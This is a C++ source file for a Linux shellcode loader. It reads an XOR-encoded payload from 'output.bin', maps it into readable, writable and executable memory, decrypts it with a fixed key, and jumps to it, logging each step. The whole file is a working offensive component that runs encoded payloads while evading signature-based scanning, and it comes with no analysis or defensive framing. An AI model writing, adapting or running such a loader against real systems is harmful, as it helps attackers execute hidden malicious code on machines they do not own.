#include <iostream>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <cstring>

#pragma GCC optimize("O0")

void xor_decrypt(unsigned char* data, size_t size, unsigned char key) {
    for (size_t i = 0; i < size; i++) {
        data[i] ^= key;
    }
}

int main() {
    const char* filename = "output.bin";
    const unsigned char xorKey = 0xAA;

    int fd = open(filename, O_RDONLY);
    if (fd < 0) {
        perror("[-] Cannot open file");
        return 1;
    }

    struct stat st;
    if (fstat(fd, &st) < 0) {
        perror("[-] fstat failed");
        close(fd);
        return 1;
    }

    size_t fileSize = st.st_size;

    void* shellcode = mmap(
        NULL,
        fileSize,
        PROT_READ | PROT_WRITE | PROT_EXEC,
        MAP_PRIVATE | MAP_ANONYMOUS,
        -1,
        0
    );

    if (shellcode == MAP_FAILED) {
        perror("[-] mmap failed");
        close(fd);
        return 1;
    }

    ssize_t bytesRead = read(fd, shellcode, fileSize);
    if (bytesRead != fileSize) {
        perror("[-] read failed");
        munmap(shellcode, fileSize);
        close(fd);
        return 1;
    }

    close(fd);

    std::cout << "[+] Decrypting shellcode (" 
              << fileSize << " bytes)..." << std::endl;

    xor_decrypt((unsigned char*)shellcode, fileSize, xorKey);

    std::cout << "[+] Executing shellcode at " 
              << shellcode << "..." << std::endl;

    void (*func)() = (void(*)())shellcode;
    func();

    munmap(shellcode, fileSize);

    std::cout << "[+] Done" << std::endl;
    return 0;
}